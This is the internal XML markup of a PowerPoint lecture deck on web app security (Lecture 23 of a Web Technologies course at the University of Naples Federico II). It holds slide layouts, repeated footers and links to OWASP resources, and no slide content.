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Default Extension="png" ContentType="image/png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Default Extension="jpg" ContentType="image/jpg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  <p:sldId id="297" r:id="rId47"/>
    <p:sldId id="298" r:id="rId48"/>
    <p:sldId id="299" r:id="rId49"/>
    <p:sldId id="300" r:id="rId50"/>
    <p:sldId id="301" r:id="rId51"/>
    <p:sldId id="302" r:id="rId52"/>
    <p:sldId id="303" r:id="rId53"/>
    <p:sldId id="304" r:id="rId54"/>
    <p:sldId id="305" r:id="rId55"/>
    <p:sldId id="306" r:id="rId56"/>
    <p:sldId id="307" r:id="rId57"/>
    <p:sldId id="308" r:id="rId58"/>
    <p:sldId id="309" r:id="rId59"/>
  </p:sldIdLst>
  <p:sldSz cx="12192000" cy="6858000"/>
  <p:notesSz cx="12192000" cy="68580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slide" Target="slides/slide17.xml"/><Relationship Id="rId23" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide18.xml"/><Relationship Id="rId24" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide19.xml"/><Relationship Id="rId25" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide20.xml"/><Relationship Id="rId26" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide21.xml"/><Relationship Id="rId27" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide22.xml"/><Relationship Id="rId28" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide23.xml"/><Relationship Id="rId29" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide24.xml"/><Relationship Id="rId30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide25.xml"/><Relationship Id="rId31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide26.xml"/><Relationship Id="rId32" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide27.xml"/><Relationship Id="rId33" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide28.xml"/><Relationship Id="rId34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide29.xml"/><Relationship Id="rId35" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide30.xml"/><Relationship Id="rId36" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide31.xml"/><Relationship Id="rId37" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide32.xml"/><Relationship Id="rId38" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide33.xml"/><Relationship Id="rId39" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide34.xml"/><Relationship Id="rId40" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide35.xml"/><Relationship Id="rId41" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide36.xml"/><Relationship Id="rId42" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide37.xml"/><Relationship Id="rId43" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide38.xml"/><Relationship Id="rId44" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide39.xml"/><Relationship Id="rId45" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide40.xml"/><Relationship Id="rId46" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide41.xml"/><Relationship Id="rId47" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide42.xml"/><Relationship Id="rId48" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide43.xml"/><Relationship Id="rId49" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide44.xml"/><Relationship Id="rId50" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide45.xml"/><Relationship Id="rId51" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide46.xml"/><Relationship Id="rId52" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide47.xml"/><Relationship Id="rId53" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide48.xml"/><Relationship Id="rId54" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide49.xml"/><Relationship Id="rId55" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide50.xml"/><Relationship Id="rId56" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide51.xml"/><Relationship Id="rId57" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide52.xml"/><Relationship Id="rId58" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide53.xml"/><Relationship Id="rId59" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide54.xml"/></Relationships>
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600" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahom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0" i="0">
                <a:solidFill>
                  <a:srgbClr val="111F35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006379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240"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr marL="115570">
              <a:lnSpc>
                <a:spcPts val="1240"/>
              </a:lnSpc>
            </a:pPr>
            <a:fld id="{81D60167-4931-47E6-BA6A-407CBD079E47}" type="slidenum">
              <a:rPr dirty="0" spc="-50"/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1" i="0">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahom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800" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="111F35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006379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240"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr marL="115570">
              <a:lnSpc>
                <a:spcPts val="1240"/>
              </a:lnSpc>
            </a:pPr>
            <a:fld id="{81D60167-4931-47E6-BA6A-407CBD079E47}" type="slidenum">
              <a:rPr dirty="0" spc="-50"/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showMasterSp="0">
  <p:cSld name="Two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6096000" y="0"/>
            <a:ext cx="6096000" cy="6858000"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="6096000" h="6858000">
                <a:moveTo>
                  <a:pt x="6096000" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="6858000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6096000" y="6858000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6096000" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="D7003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1" i="0">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahom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962050" y="1533220"/>
            <a:ext cx="4831715" cy="416369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0" i="0">
                <a:solidFill>
                  <a:srgbClr val="111F35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6251828" y="1533220"/>
            <a:ext cx="4966334" cy="416369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0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006379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240"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr marL="115570">
              <a:lnSpc>
                <a:spcPts val="1240"/>
              </a:lnSpc>
            </a:pPr>
            <a:fld id="{81D60167-4931-47E6-BA6A-407CBD079E47}" type="slidenum">
              <a:rPr dirty="0" spc="-50"/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1" i="0">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahom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006379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240"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr marL="115570">
              <a:lnSpc>
                <a:spcPts val="1240"/>
              </a:lnSpc>
            </a:pPr>
            <a:fld id="{81D60167-4931-47E6-BA6A-407CBD079E47}" type="slidenum">
              <a:rPr dirty="0" spc="-50"/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showMasterSp="0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397755" y="22858"/>
            <a:ext cx="5794243" cy="6835139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006379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240"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr marL="115570">
              <a:lnSpc>
                <a:spcPts val="1240"/>
              </a:lnSpc>
            </a:pPr>
            <a:fld id="{81D60167-4931-47E6-BA6A-407CBD079E47}" type="slidenum">
              <a:rPr dirty="0" spc="-50"/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962050" y="557529"/>
            <a:ext cx="10299700" cy="57805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600" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahom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962050" y="1533220"/>
            <a:ext cx="10013315" cy="429069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0" i="0">
                <a:solidFill>
                  <a:srgbClr val="111F35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962050" y="6465214"/>
            <a:ext cx="7694295" cy="1778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00" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="006379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240"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security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11024361" y="6465214"/>
            <a:ext cx="244475" cy="1778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00" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr marL="115570">
              <a:lnSpc>
                <a:spcPts val="1240"/>
              </a:lnSpc>
            </a:pPr>
            <a:fld id="{81D60167-4931-47E6-BA6A-407CBD079E47}" type="slidenum">
              <a:rPr dirty="0" spc="-50"/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hyperlink" Target="mailto:luigiliberolucio.starace@unina.it" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://luistar.github.io/" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.docenti.unina.it/luigiliberolucio.starace" TargetMode="External"/></Relationships>
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/Relationships>
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https://owasp.org/" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://owasp.org/Top10/" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image2.png"/></Relationships>
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https://owasp.org/www-project-juice-shop/" TargetMode="External"/></Relationships>
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3.jpg"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image4.jpg"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image5.png"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image6.png"/></Relationships>
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7.jpg"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image8.jpg"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image9.png"/></Relationships>

</file>

<file path=ppt/slides/_rels/slide1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0.png"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image11.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image12.png"/></Relationships>

</file>

<file path=ppt/slides/_rels/slide1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3.jpg"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image14.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image15.png"/></Relationships>

</file>

